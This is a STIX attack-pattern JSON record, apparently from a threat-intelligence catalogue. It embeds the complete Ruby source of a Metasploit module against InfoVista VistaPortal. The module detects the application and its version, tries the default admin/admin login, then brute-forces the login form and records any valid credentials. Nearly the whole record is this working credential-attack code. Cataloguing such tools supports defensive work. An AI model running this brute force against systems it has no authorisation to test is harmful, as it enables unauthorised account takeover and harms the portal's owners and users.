{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--13032749-880e-452d-b3be-5a6443875c2d",
    "created": "2024-08-14T16:29:51.628746Z",
    "modified": "2024-08-14T16:29:51.628749Z",
    "name": "InfoVista VistaPortal Application Bruteforce Login Utility",
    "description": " This module attempts to scan for InfoVista VistaPortal Web Application, finds its version and performs login brute force to identify valid credentials. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/infovista_enum.rb",
            "external_id": "infovista_enum.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'InfoVista VistaPortal Application Bruteforce Login Utility',\n      'Description'    => %{\n        This module attempts to scan for InfoVista VistaPortal Web Application, finds its\n      version and performs login brute force to identify valid credentials.\n      },\n      'Author'         =>\n        [\n          'Karn Ganeshen <KarnGaneshen[at]gmail.com>',\n        ],\n      'License'        => MSF_LICENSE,\n      'DefaultOptions' => { 'SSL' => true }\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('TARGETURI', [true, \"URI for Web login. Default: /VPortal/mgtconsole/CheckPassword.jsp\", \"/VPortal/mgtconsole/CheckPassword.jsp\"])\n      ])\n  end\n\n  def run_host(ip)\n    unless is_app_infovista?\n      print_error(\"#{rhost}:#{rport} - Application does not appear to be InfoVista VistaPortal. Module will not continue.\")\n      return\n    end\n\n    status = try_default_credential\n    return if status == :abort\n\n    print_status(\"#{rhost}:#{rport} - Brute-forcing...\")\n    each_user_pass do |user, pass|\n      do_login(user, pass)\n    end\n  end\n\n  #\n  # What's the point of running this module if the app actually isn't InfoVista?\n  #\n  def is_app_infovista?\n    res = send_request_cgi(\n    {\n      'uri'       => '/VPortal/',\n      'method'    => 'GET'\n    })\n\n    if (res and res.code == 200 and res.body =~ /InfoVista.*VistaPortal/)\n      version_key = /PORTAL_VERSION = (.+)./\n      version = res.body.scan(version_key).flatten[0].gsub('\"','')\n      print_good(\"#{rhost}:#{rport} - Application version is #{version}\")\n      return true\n    else\n      return false\n    end\n  end\n\n  #\n  # Test and see if the default credential works\n  #\n  def try_default_credential\n    user = 'admin'\n    pass = 'admin'\n    do_login(user, pass)\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: 'InfoVista VistaPortal',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: DateTime.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  #\n  # Brute-force the login page\n  #\n  def do_login(user, pass)\n    vprint_status(\"#{rhost}:#{rport} - Trying username:#{user.inspect} with password:#{pass.inspect}\")\n    begin\n      res = send_request_cgi(\n      {\n        'uri'       => target_uri.to_s,\n        'method'    => 'POST',\n        'vars_post' =>\n          {\n            'Login' => user,\n            'password' => pass\n          }\n      })\n\n      if (not res or res.code != 200 or res.body !~ /location.href.*AdminFrame\\.jsp/)\n        vprint_error(\"#{rhost}:#{rport} - FAILED LOGIN - #{user.inspect}:#{pass.inspect} with code #{res.code}\")\n      else\n        print_good(\"#{rhost}:#{rport} - SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}\")\n        report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.body)\n        return :next_user\n      end\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE\n      print_error(\"#{rhost}:#{rport} - HTTP Connection Failed, Aborting\")\n      return :abort\n    end\n  end\nend\n"
}